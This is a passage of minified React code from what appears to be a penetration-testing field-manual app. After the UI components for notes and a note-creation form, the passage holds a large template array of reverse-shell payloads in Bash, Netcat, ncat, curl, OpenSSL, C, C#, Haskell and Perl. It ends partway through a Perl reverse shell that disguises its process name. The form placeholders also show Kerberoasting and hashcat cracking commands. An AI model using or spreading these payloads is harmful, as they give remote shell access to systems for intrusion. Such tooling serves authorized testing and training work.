text-cyber-muted",children:[$.outgoingWikilinks.length," Outgoing · ",pe.length," Backlinks"]})]}),e.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 gap-4",children:[e.jsxs("div",{className:"space-y-2",children:[e.jsxs("span",{className:"text-[10px] font-mono font-bold text-cyber-muted uppercase tracking-wider",children:["Outgoing References (",$.outgoingWikilinks.length,"):"]}),$.outgoingWikilinks.length===0?e.jsx("p",{className:"text-[11px] text-cyber-muted italic",children:"No internal links in this note."}):e.jsx("div",{className:"flex flex-wrap gap-1.5",children:$.outgoingWikilinks.map((i,c)=>{const d=vt(i);return e.jsxs("button",{type:"button",onClick:()=>{d.exists&&d.targetNoteId&&(B&&p("click"),D(d.targetNoteId))},className:"inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-mono transition-all "+(d.exists?"bg-purple-950/60 border border-purple-500/40 text-purple-300 hover:bg-purple-900/80 hover:text-white cursor-pointer":"bg-white/5 border border-white/10 text-cyber-muted opacity-60 cursor-default"),children:[e.jsx(Xe,{className:"w-2.5 h-2.5"}),e.jsx("span",{children:"[[' + target + ']]"})]},c)})})]}),e.jsxs("div",{className:"space-y-2",children:[e.jsxs("span",{className:"text-[10px] font-mono font-bold text-cyber-muted uppercase tracking-wider",children:["Referenced By Other Notes (",pe.length,"):"]}),pe.length===0?e.jsx("p",{className:"text-[11px] text-cyber-muted italic",children:"No incoming backlinks to this note."}):e.jsx("div",{className:"flex flex-wrap gap-1.5",children:pe.map(i=>e.jsxs("button",{type:"button",onClick:()=>{B&&p("click"),D(i.id)},className:"inline-flex items-center gap-1 px-2 py-1 rounded text-xs font-mono bg-purple-950/60 border border-purple-500/40 text-purple-300 hover:bg-purple-900/80 hover:text-white transition-all cursor-pointer",title:i.titleEn,children:[e.jsx(Ut,{className:"w-2.5 h-2.5 text-purple-400"}),e.jsx("span",{className:"truncate max-w-[200px]",children:i.titleEn})]},i.id))})]})]})]})]}),e.jsxs("div",{className:"flex items-center justify-between px-4 py-2 bg-cyber-bg/95 border-t border-purple-900/40 text-[11px] font-mono text-cyber-muted",children:[e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsxs("span",{children:["ID: ",a.id]}),e.jsx("span",{className:"hidden sm:inline",children:"·"}),e.jsxs("span",{className:"hidden sm:inline",children:["Category: ",a.category]})]}),e.jsxs("div",{className:"flex items-center gap-3",children:[e.jsx("span",{children:"ESC to close"}),e.jsx("button",{type:"button",onClick:g,className:"text-purple-400 hover:text-white font-bold transition-colors cursor-pointer",children:"Close"})]})]})]})});return typeof document<"u"?Vt.createPortal(V,document.body):V},jt=({node:a,depth:C,expandedFolders:B,onToggleFolder:g,selectedPath:D,onSelectFolder:L,onSelectNote:ne,onDeleteNote:U,onAddNoteToFolder:u,cptsLangMode:E="en"})=>{const F=!!B[a.id],X=a.isFolder,oe=D===a.fullPath;if(X)return e.jsxs("div",{className:"select-none text-xs font-mono","data-tree-type":"folder","data-tree-path":a.fullPath,children:[e.jsxs("div",{onClick:()=>{g(a.id),L(a.fullPath)},className:`flex items-center justify-between py-1 px-1.5 rounded-md cursor-pointer transition-all group ${oe?"bg-purple-100 dark:bg-purple-600/30 text-purple-950 dark:text-purple-200 border border-purple-300 dark:border-purple-400/40 font-bold shadow-sm":"text-slate-700 dark:text-cyber-muted hover:text-purple-950 dark:hover:text-white hover:bg-purple-50 dark:hover:bg-cyber-bg/70 border border-transparent"}`,title:a.name,children:[e.jsxs("div",{className:"flex items-center gap-1.5 truncate flex-1 min-w-0 pr-1",children:[e.jsx("button",{type:"button",onClick:R=>{R.stopPropagation(),g(a.id)},className:"p-0.5 rounded hover:bg-purple-200 dark:hover:bg-purple-900/50 text-slate-400 dark:text-purple-400 hover:text-purple-800 dark:hover:text-purple-200 focus:outline-none transition-all cursor-pointer",title:F?"Collapse folder":"Expand folder",children:e.jsx(et,{className:`w-3.5 h-3.5 transition-transform duration-150 ${F?"rotate-90 text-purple-600 dark:text-purple-300":""}`})}),F?e.jsx(_e,{className:"w-3.5 h-3.5 text-purple-600 dark:text-purple-400 flex-shrink-0"}):e.jsx(Re,{className:"w-3.5 h-3.5 text-purple-500 dark:text-purple-400/80 flex-shrink-0"}),e.jsx("span",{className:"truncate text-[11px] group-hover:text-purple-950 dark:group-hover:text-purple-200",children:a.name})]}),e.jsxs("div",{className:"flex items-center gap-1 flex-shrink-0",children:[u&&e.jsx("button",{type:"button",onClick:R=>{R.stopPropagation(),u(a.fullPath)},className:"opacity-0 group-hover:opacity-100 p-0.5 rounded text-purple-600 dark:text-purple-400 hover:text-white hover:bg-purple-600 transition-all cursor-pointer",title:`Add note inside ${a.name}`,children:e.jsx(je,{className:"w-3 h-3"})}),e.jsx("span",{className:"text-[9px] font-mono px-1.5 py-0.2 rounded bg-slate-200/80 dark:bg-black/40 border border-slate-300/80 dark:border-cyber-border text-purple-900 dark:text-purple-300",children:a.count})]})]}),F&&a.children&&a.children.length>0&&e.jsx("div",{className:"border-l border-purple-300/40 dark:border-purple-500/25 ml-2.5 pl-1.5 space-y-0.5 mt-0.5",children:a.children.map(R=>e.jsx(jt,{node:R,depth:C+1,expandedFolders:B,onToggleFolder:g,selectedPath:D,onSelectFolder:L,onSelectNote:ne,onDeleteNote:U,onAddNoteToFolder:u,cptsLangMode:E},R.id))})]});const v=a.note;if(!v)return null;const A=E==="he"&&v.titleHe?v.titleHe:a.name||v.titleEn||v.title;return e.jsxs("div",{onClick:()=>ne(v),"data-tree-type":"note","data-note-id":v.id,className:"flex items-center justify-between py-1 px-1.5 rounded-md text-xs font-mono cursor-pointer transition-all text-slate-700 dark:text-cyber-muted hover:text-purple-950 dark:hover:text-white hover:bg-purple-100 dark:hover:bg-purple-950/40 group border border-transparent hover:border-purple-200 dark:hover:border-purple-800/40",title:A,children:[e.jsxs("div",{className:"flex items-center gap-1.5 truncate flex-1 min-w-0 pr-1 pl-4",children:[e.jsx($t,{className:"w-3.5 h-3.5 text-slate-400 dark:text-cyber-muted group-hover:text-purple-600 dark:group-hover:text-purple-400 flex-shrink-0 transition-colors"}),e.jsx("span",{className:"truncate text-[11px] group-hover:text-purple-950 dark:group-hover:text-purple-200",children:A})]}),e.jsxs("div",{className:"flex items-center gap-1 flex-shrink-0",children:[v.commands&&v.commands.length>0&&e.jsxs("span",{className:"text-[8.5px] px-1.5 py-0.2 rounded bg-slate-200/80 dark:bg-black/40 text-cyan-800 dark:text-cyber-cyan font-mono border border-slate-300/60 dark:border-transparent",children:[v.commands.length,"c"]}),U&&e.jsx("button",{type:"button",onClick:R=>{R.stopPropagation(),U(v.id,A)},className:"opacity-0 group-hover:opacity-100 p-0.5 rounded text-cyber-muted hover:text-cyber-crimson hover:bg-rose-950/40 transition-all cursor-pointer",title:"Delete note",children:e.jsx(Se,{className:"w-3 h-3"})})]})]})},Nr=[{value:"0 — Methodology",label:"0 — Methodology",color:"#64748B"},{value:"1 — Enumeration",label:"1 — Enumeration",color:"#06B6D4"},{value:"2 — Foothold",label:"2 — Foothold",color:"#F59E0B"},{value:"3 — PrivEsc",label:"3 — PrivEsc",color:"#EF4444"},{value:"4 — Lateral Movement",label:"4 — Lateral Movement",color:"#A855F7"},{value:"5 — Active Directory",label:"5 — Active Directory",color:"#EC4899"}],jr=({isOpen:a,onClose:C,onSave:B,existingDirectories:g,initialDirectory:D})=>{const[L,ne]=n.useState(""),[U,u]=n.useState(""),[E,F]=n.useState(D||g[0]||"01 Information Gathering/1 Service Enumeration"),[X,oe]=n.useState(""),[v,A]=n.useState(!1),[R,Z]=n.useState("1 — Enumeration"),[$,pe]=n.useState(""),[M,Y]=n.useState("custom, field-manual"),[y,me]=n.useState(""),[W,le]=n.useState(""),[N,ie]=n.useState(""),[w,V]=n.useState("");if(Nt.useEffect(()=>{a&&D&&(F(D),A(!1))},[a,D]),!a)return null;const i=c=>{if(c.preventDefault(),!L.trim())return;const d=v?X.trim()||"General":E,x=d.split("/").map(h=>h.trim()).filter(Boolean),k=x[0]||"General",j=x.slice(1).join(" / ")||"",r=`${L.trim().replace(/[/\\?%*:|"<>]/g,"-")}.md`,o=`${d}/${r}`,S=N.split(`
`).map(h=>h.trim()).filter(h=>h.length>0&&!h.startsWith("#")),H=$.split(",").map(h=>h.trim()).filter(Boolean),T=M.split(",").map(h=>h.trim().toLowerCase().replace(/^#/,"")).filter(Boolean);B({title:L.trim(),titleEn:L.trim(),titleHe:U.trim()||void 0,category:k,rawCategory:d,subCategory:j,relPath:o,filename:r,stage:R,tools:H.length>0?H:void 0,tags:T.length>0?T:["custom"],summary:y.trim(),enSummary:y.trim()||void 0,heSummary:W.trim()||void 0,hasHebrew:!!(U.trim()||W.trim()),commands:S,rawMarkdown:w.trim()||y.trim(),difficulty:"Custom"}),C()};return e.jsx("div",{className:"fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/80 backdrop-blur-sm animate-fade-in font-mono",children:e.jsxs(re.div,{initial:{opacity:0,scale:.95},animate:{opacity:1,scale:1},className:"w-full max-w-2xl max-h-[90vh] flex flex-col rounded-xl border border-purple-500/50 bg-cyber-card shadow-2xl overflow-hidden",onClick:c=>c.stopPropagation(),children:[e.jsxs("div",{className:"flex-shrink-0 flex items-center justify-between border-b border-purple-900/40 p-4 bg-purple-950/30",children:[e.jsxs("div",{className:"flex items-center gap-2.5",children:[e.jsx(K,{className:"w-5 h-5 text-purple-400"}),e.jsxs("div",{children:[e.jsxs("h3",{className:"text-base font-bold text-white tracking-wide flex items-center gap-2",children:[e.jsx("span",{children:"CREATE CUSTOM FIELD MANUAL NOTE"}),e.jsx("span",{className:"text-[10px] px-2 py-0.5 rounded bg-purple-900/60 border border-purple-500/40 text-purple-200",children:"OBSIDIAN COMPATIBLE"})]}),e.jsx("p",{className:"text-[11px] text-cyber-muted",children:"Create a new note into any directory depth with commands and bilingual summaries."})]})]}),e.jsx("button",{type:"button",onClick:C,className:"p-1.5 rounded bg-cyber-bg text-cyber-muted hover:text-white border border-cyber-border transition-all",children:e.jsx(Qe,{className:"w-4 h-4"})})]}),e.jsxs("form",{onSubmit:i,className:"flex-1 overflow-y-auto p-4 sm:p-5 space-y-4 text-xs scrollbar-thin",children:[e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-3",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-purple-300 font-bold uppercase tracking-wider mb-1 text-[11px]",children:"Note Title (English) *"}),e.jsx("input",{id:"new-cpts-note-title-en",name:"new-cpts-note-title-en","aria-label":"Note Title in English",type:"text",required:!0,value:L,onChange:c=>ne(c.target.value),placeholder:"e.g. Kerberoasting via Rubeus & Impacket",className:"w-full bg-cyber-bg px-3 py-2 rounded-lg border border-cyber-border text-white focus:outline-none focus:border-purple-400 transition-colors"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-purple-300 font-bold uppercase tracking-wider mb-1 text-[11px]",children:"Note Title (Hebrew - אופציונלי)"}),e.jsx("input",{id:"new-cpts-note-title-he",name:"new-cpts-note-title-he","aria-label":"Note Title in Hebrew",type:"text",dir:"rtl",value:U,onChange:c=>u(c.target.value),placeholder:"למשל: מתקפת קרברוסטינג ופיצוח טיקטים",className:"w-full bg-cyber-bg px-3 py-2 rounded-lg border border-cyber-border text-white focus:outline-none focus:border-purple-400 font-sans transition-colors"})]})]}),e.jsxs("div",{className:"space-y-1.5 p-3 rounded-lg bg-cyber-bg/70 border border-cyber-border",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("label",{className:"block text-white font-bold uppercase tracking-wider text-[11px] flex items-center gap-1.5",children:[e.jsx(Re,{className:"w-3.5 h-3.5 text-purple-400"}),e.jsx("span",{children:"Target Directory / Sub-folder Depth"})]}),e.jsx("button",{type:"button",onClick:()=>A(!v),className:"text-[10px] text-purple-400 hover:text-purple-300 underline font-semibold",children:v?"← Choose Existing Directory":"+ Create New Sub-directory"})]}),v?e.jsxs("div",{children:[e.jsx("input",{id:"new-cpts-note-custom-dir",name:"new-cpts-note-custom-dir","aria-label":"Custom directory path",type:"text",value:X,onChange:c=>oe(c.target.value),placeholder:"e.g. 03 Offensive Exploitation/01 Linux Exploitation/05 Kernel Exploits",className:"w-full bg-cyber-card px-3 py-2 rounded-lg border border-purple-500/40 text-white text-xs focus:outline-none focus:border-purple-400 font-mono"}),e.jsx("span",{className:"text-[10px] text-cyber-muted block mt-1",children:"Use slashes (/) to create nested sub-folders and sub-sub-folders."})]}):e.jsx(Ze,{value:E,onChange:F,options:g.map(c=>({value:c,label:c,icon:e.jsx(Re,{className:"w-3.5 h-3.5 text-purple-400"})})),searchable:!0,searchPlaceholder:"Search folder paths...",variant:"card",className:"w-full",triggerClassName:"w-full bg-cyber-card border-cyber-border focus:border-purple-400"})]}),e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-3 gap-3",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-cyber-muted font-bold uppercase tracking-wider mb-1 text-[10px]",children:"Offensive Stage"}),e.jsx(Ze,{value:R,onChange:Z,options:Nr,variant:"default",size:"xs",className:"w-full",triggerClassName:"w-full bg-cyber-bg border-cyber-border focus:border-purple-400"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-cyber-muted font-bold uppercase tracking-wider mb-1 text-[10px]",children:"Tools (comma-separated)"}),e.jsx("input",{id:"new-cpts-note-tools",name:"new-cpts-note-tools","aria-label":"Tools used",type:"text",value:$,onChange:c=>pe(c.target.value),placeholder:"e.g. impacket, mimikatz, hashcat",className:"w-full bg-cyber-bg px-2.5 py-1.5 rounded-lg border border-cyber-border text-white text-xs focus:outline-none focus:border-purple-400"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-cyber-muted font-bold uppercase tracking-wider mb-1 text-[10px]",children:"Tags (comma-separated)"}),e.jsx("input",{id:"new-cpts-note-tags",name:"new-cpts-note-tags","aria-label":"Tags and categories",type:"text",value:M,onChange:c=>Y(c.target.value),placeholder:"e.g. kerberos, tgs, offline-crack",className:"w-full bg-cyber-bg px-2.5 py-1.5 rounded-lg border border-cyber-border text-white text-xs focus:outline-none focus:border-purple-400"})]})]}),e.jsxs("div",{className:"space-y-1",children:[e.jsxs("div",{className:"flex items-center justify-between",children:[e.jsxs("label",{className:"block text-purple-300 font-bold uppercase tracking-wider text-[11px] flex items-center gap-1.5",children:[e.jsx(he,{className:"w-3.5 h-3.5 text-cyber-cyan"}),e.jsx("span",{children:"Commands & Payloads (One per line)"})]}),e.jsx("span",{className:"text-[10px] text-cyber-muted",children:"Supports {TARGET_IP}, {LHOST}, {LPORT}"})]}),e.jsx("textarea",{id:"new-cpts-note-commands",name:"new-cpts-note-commands","aria-label":"Commands and Payloads",rows:4,value:N,onChange:c=>ie(c.target.value),placeholder:`GetUserSPNs.py {DOMAIN}/{USER}:{PASSWORD} -dc-ip {TARGET_IP} -request
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt`,className:"w-full bg-cyber-code p-3 rounded-lg border border-cyber-border text-cyber-cyan text-xs font-mono focus:outline-none focus:border-purple-400 resize-y"})]}),e.jsxs("div",{className:"grid grid-cols-1 sm:grid-cols-2 gap-3",children:[e.jsxs("div",{children:[e.jsx("label",{className:"block text-cyber-muted font-bold uppercase tracking-wider mb-1 text-[10px]",children:"Practical Objective (English Summary)"}),e.jsx("textarea",{id:"new-cpts-note-en-summary",name:"new-cpts-note-en-summary","aria-label":"Practical objective English summary",rows:2,value:y,onChange:c=>me(c.target.value),placeholder:"Brief explanation of what this technique does and key flags...",className:"w-full bg-cyber-bg p-2 rounded-lg border border-cyber-border text-white text-xs focus:outline-none focus:border-purple-400 resize-none"})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-cyber-muted font-bold uppercase tracking-wider mb-1 text-[10px]",children:"מטרה מעשית (תקציר בעברית)"}),e.jsx("textarea",{id:"new-cpts-note-he-summary",name:"new-cpts-note-he-summary","aria-label":"מטרה מעשית תקציר בעברית",rows:2,dir:"rtl",value:W,onChange:c=>le(c.target.value),placeholder:"הסבר קצר על הטכניקה, אופן השימוש ודגשים מעשיים...",className:"w-full bg-cyber-bg p-2 rounded-lg border border-cyber-border text-white text-xs focus:outline-none focus:border-purple-400 font-sans resize-none"})]})]}),e.jsxs("div",{children:[e.jsx("label",{className:"block text-cyber-muted font-bold uppercase tracking-wider mb-1 text-[10px]",children:"Full Obsidian Markdown Content (Optional)"}),e.jsx("textarea",{id:"new-cpts-note-markdown",name:"new-cpts-note-markdown","aria-label":"Full Obsidian Markdown content",rows:3,value:w,onChange:c=>V(c.target.value),placeholder:"Detailed methodology notes, markdown tables, code walkthroughs, etc.",className:"w-full bg-cyber-bg p-2.5 rounded-lg border border-cyber-border text-white text-xs font-mono focus:outline-none focus:border-purple-400 resize-y"})]}),e.jsxs("div",{className:"pt-3 flex items-center justify-end gap-2.5 border-t border-cyber-border",children:[e.jsx("button",{type:"button",onClick:C,className:"px-4 py-2 rounded-lg bg-cyber-bg border border-cyber-border text-cyber-muted hover:text-white transition-colors",children:"Cancel"}),e.jsxs(re.button,{whileHover:{scale:1.02},whileTap:{scale:.98},type:"submit",className:"px-5 py-2 rounded-lg bg-purple-600 hover:bg-purple-500 text-white font-bold transition-all shadow-md shadow-purple-600/30 flex items-center gap-1.5 cursor-pointer",children:[e.jsx(je,{className:"w-4 h-4"}),e.jsx("span",{children:"Save Field Note"})]})]})]})]})})},Me=[{id:"rev-bash-i",name:"Bash -i",category:"Reverse",language:"Bash",platform:"Linux",command:"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-196",name:"Bash 196",category:"Reverse",language:"Bash",platform:"Linux",command:"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-read-line",name:"Bash read line",category:"Reverse",language:"Bash",platform:"Linux",command:"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-5",name:"Bash 5",category:"Reverse",language:"Bash",platform:"Linux",command:"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-bash-udp",name:"Bash udp",category:"Reverse",language:"Bash",platform:"Linux",command:"{shell} -i >& /dev/udp/{ip}/{port} 0>&1",listener:"nc -u -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-nc-mkfifo",name:"nc mkfifo",category:"Reverse",language:"Netcat",platform:"Linux",command:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-nc-e",name:"nc -e",category:"Reverse",language:"Netcat",platform:"Linux",command:"nc {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-nc-exe-e",name:"nc.exe -e",category:"Reverse",language:"Netcat",platform:"Windows",command:"nc.exe {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-busybox-nc-e",name:"BusyBox nc -e",category:"Reverse",language:"Netcat",platform:"Linux",command:"busybox nc {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-nc-c",name:"nc -c",category:"Reverse",language:"Netcat",platform:"Linux",command:"nc -c {shell} {ip} {port}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-ncat-e",name:"ncat -e",category:"Reverse",language:"Netcat",platform:"Linux",command:"ncat {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-ncat-exe-e",name:"ncat.exe -e",category:"Reverse",language:"Netcat",platform:"Windows",command:"ncat.exe {ip} {port} -e {shell}",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-ncat-udp",name:"ncat udp",category:"Reverse",language:"Netcat",platform:"Linux",command:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f",listener:"nc -u -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-curl",name:"curl",category:"Reverse",language:"cURL / Telnet",platform:"Linux",command:"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null",listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-rustcat",name:"rustcat",category:"Reverse",language:"Rustcat",platform:"Linux",command:"rcat connect -s {shell} {ip} {port}",listener:"rcat -lp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-c",name:"C",category:"Reverse",language:"C / C#",platform:"Linux",command:`#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = {port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{ip}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * var argv[] = {"{shell}", NULL};
    execvp("{shell}", argv);

    return 0;       
}`,listener:"nc -lvnp {port}",notes:"",extension:".c",isFullScript:!0},{id:"rev-c-windows",name:"C Windows",category:"Reverse",language:"C / C#",platform:"Windows",command:`#include <winsock2.h>\r
#include <stdio.h>\r
#pragma comment(lib,"ws2_32")\r
\r
WSADATA wsaData;\r
SOCKET Winsock;\r
struct sockaddr_in hax; \r
char ip_addr[16] = "{ip}"; \r
char port[6] = "{port}";            \r
\r
STARTUPINFO ini_processo;\r
\r
PROCESS_INFORMATION processo_info;\r
\r
int main()\r
{\r
    WSAStartup(MAKEWORD(2, 2), &wsaData);\r
    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\r
\r
\r
    struct hostent *host; \r
    host = gethostbyname(ip_addr);\r
    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\r
\r
    hax.sin_family = AF_INET;\r
    hax.sin_port = htons(atoi(port));\r
    hax.sin_addr.s_addr = inet_addr(ip_addr);\r
\r
    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\r
\r
    memset(&ini_processo, 0, sizeof(ini_processo));\r
    ini_processo.cb = sizeof(ini_processo);\r
    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \r
    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\r
\r
    TCHAR cmd[255] = TEXT("cmd.exe");\r
\r
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\r
\r
    return 0;\r
}`,listener:"nc -lvnp {port}",notes:"",extension:".c",isFullScript:!0},{id:"rev-c-tcp-client",name:"C# TCP Client",category:"Reverse",language:"C / C#",platform:"Both",command:`using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient("{ip}", {port}))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "{shell}";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}`,listener:"nc -lvnp {port}",notes:"",extension:".cs",isFullScript:!0},{id:"rev-c-bash-i",name:"C# Bash -i",category:"Reverse",language:"Bash",platform:"Both",command:`using System;
using System.Diagnostics;

namespace BackConnect {
  class ReverseBash {
	public static void Main(string[] args) {
	  Process proc = new System.Diagnostics.Process();
	  proc.StartInfo.FileName = "{shell}";
	  proc.StartInfo.Arguments = "-c \\"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1\\"";
	  proc.StartInfo.UseShellExecute = false;
	  proc.StartInfo.RedirectStandardOutput = true;
	  proc.Start();

	  while (!proc.StandardOutput.EndOfStream) {
		Console.WriteLine(proc.StandardOutput.ReadLine());
	  }
	}
  }
}
`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!0},{id:"rev-haskell-1",name:"Haskell #1",category:"Reverse",language:"Haskell",platform:"Linux",command:`module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f"`,listener:"nc -lvnp {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-openssl",name:"OpenSSL",category:"Reverse",language:"OpenSSL",platform:"Linux",command:"mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s",listener:"openssl s_server -quiet -key key.pem -cert cert.pem -port {port}",notes:"",extension:".txt",isFullScript:!1},{id:"rev-perl",name:"Perl",category:"Reverse",language:"Perl",platform:"Linux",command:`perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'`,listener:"nc -lvnp {port}",notes:"",extension:".pl",isFullScript:!1},{id:"rev-perl-no-sh",name:"Perl no sh",category:"Reverse",language:"Perl",platform:"Linux",command:`perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{ip}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'`,listener:"nc -lvnp {port}",notes:"",extension:".sh",isFullScript:!1},{id:"rev-perl-pentestmonkey",name:"Perl PentestMonkey",category:"Reverse",language:"Perl",platform:"Linux",command:`#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  If these terms are not acceptable to
# you, then do not use this tool.
#
# You are encouraged to send comments, improvements or suggestions to
# me at pentestmonkey@pentestmonkey.net
#
# Description
# -----------
# This script will make an outbound TCP connection to a hardcoded IP and port.
# The recipient will be given a shell running as the current user (apache normally).
#

use strict;
use Socket;
use FileHandle;
use POSIX;
my $VERSION = "1.0";

# Where to send the reverse shell.  Change these.
my $ip = '{ip}';
my $port = {port};

# Options
my $daemon = 1;
my $auth   = 0; # 0 means authentication is disabled and any 
		# source IP can access the reverse shell
my $authorised_client_pattern = qr(^127\\.0\\.0\\.1$);

# Declarations
my $global_page = "";
my $fake_process_name = "/usr/sbin/apache";

# Change the process name to be less conspicious
$0 = "[httpd]";

# Authenticate based on source IP address if required
if (defined($ENV{'REMOTE_ADDR'})) {
	cgiprint("Browser IP address appears to be: $ENV{'REMOTE_ADDR'}");

	if ($auth) {
		unless ($ENV{'REMOTE_ADDR'} =~ $authorised_client_pattern) {
			cgiprint("ERROR: Your client isn't authorised to view this page");
			cgiexit();
		}
	}
} elsif ($auth) {
	cgiprint("ERROR: Authentication is enabled, but I couldn't determine your IP address.  Denying access");
	cgiexit(0);
}

# Background and dissociate from parent process if required
if ($daemon) {
	my $pid = fork();
	if ($pid) {
		cgiexit(0); # parent exits
	}

	setsid();
	chdir('/');
	umask(0);
}

# Make TCP connection for reverse shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
	cgiprint("Sent reverse shell to $ip:$port");
	cgiprintpage();
} else {
